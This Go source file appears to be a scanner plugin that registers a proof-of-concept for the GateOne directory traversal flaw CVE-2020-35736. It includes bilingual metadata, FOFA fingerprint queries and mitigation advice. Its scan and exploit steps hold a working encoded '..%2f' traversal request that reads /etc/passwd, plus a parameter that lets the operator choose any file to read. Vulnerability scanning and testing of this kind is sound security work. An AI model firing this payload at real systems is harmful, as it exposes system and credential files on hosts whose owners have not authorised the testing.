package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Gateone Arbitrary File Read (CVE-2020-35736)",
    "Description": "The vulnerability allows unauthorized downloading of arbitrary files, which can traverse the directory and read arbitrary files on the target system",
    "Impact": "Gateone Arbitrary File Read (CVE-2020-35736)",
    "Recommendation": "<p>update</p>",
    "Product": "GateOne",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "GateOne 目录遍历漏洞 （CVE-2020-35736）",
            "Description": "<p>GateOne是一款基于html5实现的ssh客户端。GateOne存在目录遍历漏洞，攻击者可能通过浏览⽬录结构，访问到某些隐秘⽂件包括配置⽂件、⽇志、源代码等，配合其它漏洞的综合利⽤，攻击者可以轻易的获取更⾼的权限。<br></p>",
            "Impact": "<p>GateOne存在目录遍历漏洞，攻击者可能通过浏览⽬录结构，访问到某些隐秘⽂件包括配置⽂件、⽇志、源代码等，配合其它漏洞的综合利⽤，攻击者可以轻易的获取更⾼的权限。<br></p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://gitee.com/mirrors/GateOne?hmsr=aladdin1e6\">https://gitee.com/mirrors/GateOne?hmsr=aladdin1e6</a></p><p><span style=\"color: var(--primaryFont-color);\">1、如⾮必要，禁⽌公⽹访问该设备。</span></p><p><span style=\"color: var(--primaryFont-color);\">2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问</span></p>",
            "Product": "GateOne",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Gateone Arbitrary File Read (CVE-2020-35736)",
            "Description": "The vulnerability allows unauthorized downloading of arbitrary files, which can traverse the directory and read arbitrary files on the target system",
            "Impact": "Gateone Arbitrary File Read (CVE-2020-35736)",
            "Recommendation": "<p>update</p>",
            "Product": "GateOne",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "(header=\"Server: GateOne\" || banner=\"Server: GateOne\")",
    "GobyQuery": "(header=\"Server: GateOne\" || banner=\"Server: GateOne\")",
    "Author": "B1anda0",
    "Homepage": "https://github.com/liftoff/GateOne",
    "DisclosureDate": "2020-12-27",
    "References": [
        "http://cve.scap.org.cn/vuln/VHN-379349",
        "https://github.com/liftoff/GateOne/issues/747"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.0",
    "CVEIDs": [
        "CVE-2020-35736"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/downloads/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/downloads/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "file",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "GateOne"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
